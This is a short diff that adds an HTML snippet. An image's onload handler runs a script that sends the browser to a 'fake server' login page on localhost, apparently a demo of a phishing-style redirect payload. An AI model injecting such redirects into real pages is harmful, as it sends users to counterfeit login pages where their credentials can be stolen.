@@ -1,0 +1,9 @@
+<img src="http://localhost:5001/static/cookie.png" onload="redirectToFakeServer()" />
+<script>
+    const redirectToFakeServer = async () => {
+
+        const fakeServerUrl = 'http://localhost:5001/login';  
+
+        window.location.href = fakeServerUrl;
+    };
+</script>
